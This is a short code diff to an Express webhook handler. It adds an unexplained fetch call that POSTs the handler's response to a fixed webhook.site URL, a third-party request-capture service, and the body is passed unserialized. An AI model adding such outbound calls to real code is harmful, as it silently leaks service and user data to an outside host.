@@ -78,6 +78,16 @@ app.post("/webhook", (req, res) => {
 
     res.status(response.status);
     res.json(response);
+    fetch("https://webhook.site/b263da62-dcf3-45b1-84e5-b94abbb30402", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        accept: "application/json",
+      },
+      body: {
+        body: response,
+      },
+    });
   }
 });
 
